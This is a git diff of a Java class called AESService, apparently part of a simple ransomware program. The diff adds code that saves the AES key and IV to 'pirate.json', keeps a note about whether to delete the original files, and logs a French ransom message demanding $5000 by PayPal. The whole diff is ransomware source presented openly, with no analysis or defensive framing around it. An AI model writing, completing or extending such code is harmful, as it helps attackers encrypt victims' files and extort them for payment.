@@ -18,6 +18,7 @@ import java.util.stream.Collectors;
 public class AESService {
 
     private static final String ENCRYPTED_FILES_FILENAME = "pirate.txt";
+    private static final String ENCRYPTION_PARAMS_FILENAME = "pirate.json";
 
     public static void execute(Args args) {
         switch (args.operation) {
@@ -30,7 +31,10 @@ public class AESService {
         }
     }
 
-    // TODO : Add javadocs
+    /**
+     * @param directory Directory to encrypt files in
+     * @param fileTypes File types to encrypt
+     */
     private static void encrypt(File directory, List<FileType> fileTypes) {
         Logger.logDebug(String.format(
                 "Encrypting with directory %s and file types %s",
@@ -57,10 +61,13 @@ public class AESService {
         List<FileAsBytes> encryptedBytes = CipherUtils.encrypt(fileBytes, key, iv);
         List<FileAsStrings> encryptedFiles = ByteUtils.toStrings(encryptedBytes);
 
+        // Save filenames and contents to pirate.txt
         FileUtils.saveStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFiles);
 
-        // TODO : Build object of used key and iv
-        // TODO : Save used keys and iv to pirate.json
+        // Save key and iv to pirate.json
+        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
+
+        // TODO : Delete encrypted files?
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
